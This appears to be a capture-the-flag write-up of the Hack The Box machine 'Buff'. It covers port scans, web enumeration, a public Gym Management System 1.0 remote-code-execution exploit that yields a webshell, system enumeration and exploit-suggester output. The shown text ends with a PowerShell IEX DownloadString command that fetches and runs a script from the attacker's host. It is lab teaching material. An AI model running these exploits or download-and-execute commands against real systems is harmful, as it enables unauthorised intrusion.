# Buff
## Reconnaissance

* Performed TCP and UDP scans using Nmap & Masscan.
```
kali@kali:~/HTB/buff$ sudo masscan -p1-65535 10.10.10.198 --rate=1000 -e tun0 > ports && ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//') && nmap -Pn -sV -sC -A -p$ports 10.10.10.198
[sudo] password for kali: 

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-11-09 05:36:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 00:37 EST
Nmap scan report for 10.10.10.198
Host is up (0.27s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.32 seconds


PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

* Web enumeration
```
dirbuster for http://10.10.10.198:8080
Threads:30
extensions:php,aspx,asp,txt
not recursive
```
![image](https://raw.githubusercontent.com/kookiecrack/images/main/dirbuster-buff.png)

## Delivery and Exploitation
* Webpage suggests that it used Gym Management Software 1.0
![image](https://raw.githubusercontent.com/kookiecrack/images/main/web-enum-buff.png)

* Searchsploit for Gym Management exploit. Webshell obtained
```
kali@kali:~/HTB/buff$ searchsploit -m php/webapps/48506.py
  Exploit: Gym Management System 1.0 - Unauthenticated Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48506     
     Path: /usr/share/exploitdb/exploits/php/webapps/48506.py
File Type: Python script, ASCII text executable, with CRLF line terminators
                                                                                                                  
Copied to: /home/kali/HTB/buff/48506.py                                                                           
                                          

kali@kali:~/HTB/buff$ python 48506.py 'http://10.10.10.198:8080/'
            /\                                           
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/                                                                                                    
                                                                                                                  
[+] Successfully connected to webshell.                                                                           
C:\xampp\htdocs\gym\upload> whoami   
                                                         
buff\shaun                                               
                                                                                                                  
C:\xampp\htdocs\gym\upload> ipconfig                                                                              
                                                         
                                                         
Windows IP Configuration                                 
                                                         
                                                         
Ethernet adapter Ethernet0:                              
                                                         
   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::e08d:2e97:530f:20d2
   Temporary IPv6 Address. . . . . . : dead:beef::281a:6286:c82e:b88c
   Link-local IPv6 Address . . . . . : fe80::e08d:2e97:530f:20d2%10
   IPv4 Address. . . . . . . . . . . : 10.10.10.198 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:9eb2%10
                                       10.10.10.2                                                                 
```
* Systeminfo
```
C:\xampp\htdocs\gym\upload> systeminfo
�PNG                                                     
                                                         
                                                                                                                  
Host Name:                 BUFF                                                                                   
OS Name:                   Microsoft Windows 10 Enterprise                                                        
OS Version:                10.0.17134 N/A Build 17134                                                             
OS Manufacturer:           Microsoft Corporation                                                                  
OS Configuration:          Standalone Workstation                                                                 
OS Build Type:             Multiprocessor Free                                                                    
Registered Owner:          shaun                 
Registered Organization:                                                                                          
Product ID:                00329-10280-00000-AA218                                                                
Original Install Date:     16/06/2020, 14:05:58                                                                   
System Boot Time:          09/11/2020, 05:39:00       
System Manufacturer:       VMware, Inc.                                                                           
System Model:              VMware7,1                                                                              
System Type:               x64-based PC                  
Processor(s):              2 Processor(s) Installed.     
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 19/06/2019     
Windows Directory:         C:\Windows                                                                             
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2                                                                
System Locale:             en-us;English (United States) 
Input Locale:              en-gb;English (United Kingdom)                                                         
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB                                                                               
Available Physical Memory: 2,531 MB                      
Virtual Memory: Max Size:  4,799 MB                                                                               
Virtual Memory: Available: 2,539 MB
Virtual Memory: In Use:    2,260 MB                                                                               
Page File Location(s):     C:\pagefile.sys                                                                        
Domain:                    WORKGROUP                                                                              
Logon Server:              N/A                           
Hotfix(s):                 N/A                                                                                    
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter                                                         
                                 Connection Name: Ethernet0          
                                 DHCP Enabled:    No                                                              
                                 IP address(es)                                                                   
                                 [01]: 10.10.10.198                                                               
                                 [02]: fe80::e08d:2e97:530f:20d2                                                  
                                 [03]: dead:beef::281a:6286:c82e:b88c                                             
                                 [04]: dead:beef::e08d:2e97:530f:20d2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.   
```
* Use Exploit Suggester
```
kali@kali:~/HTB/buff$ python windows-exploit-suggester.py --database 2020-11-09-mssb.xls --systeminfo systeminfo.t
xt                                                                                                                
[*] initiating winsploit version 3.3...                                                                           
[*] database file detected as xls or xlsx based on extension                                                      [*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)                                                               [*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns                                                                             
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                                        
[+] windows version identified as 'Windows 10 64-bit'
[*]                                                                                                               
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important                               [*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]                                                                                                               
[E] MS16-129: Cumulative Security Update for Microsoft Edge (3199057) - Critical                                  [*]   https://www.exploit-db.com/exploits/40990/ -- Microsoft Edge (Windows 10) - 'chakra.dll' Info Leak / Type Co
nfusion Remote Code Execution                                                                                     [*]   https://github.com/theori-io/chakra-2016-11
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                                                       
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important                              
[*]   https://github.com/foxglovesec/RottenPotato                                                                 [*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Eleva
tion of Privilege                                                                                                 
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation            [*]         
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important                              [*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers H
eap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC                                                   [*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption 
(MS16-074), PoC
[*]                                                                                                               [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC                                      
[*]                                                                                                               
[E] MS16-056: Security Update for Windows Journal (3156761) - Critical
[*]   https://www.exploit-db.com/exploits/40881/ -- Microsoft Internet Explorer - jscript9 Java­Script­Stack­Walke
r Memory Corruption (MS15-056)
[*]   http://blog.skylined.nl/20161206001.html -- MSIE jscript9 Java­Script­Stack­Walker memory corruption        
[*]                                                                                                               
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important           
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF     
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC                                                           
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)                      
[*]                                                                                                               
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important                  
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF    
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC                                          
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC                                          
[*]                                                                                                               
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important        
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*]                                                      
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important        
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC                                                                          
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC                                      
[*]                                                                                                               
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important        
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC                                                                              
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC                                                     
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)                           
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC                                    
[*]                                                                                                               
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important 
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC                                                                                           
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC                                                                                                               
[*]            
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical                                                                                                                
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC                            
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC         
[*]                                                                                                               
[*] done                                                                                                          
```

* Sherlock
```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12:8000/Sherlock.ps1')
```
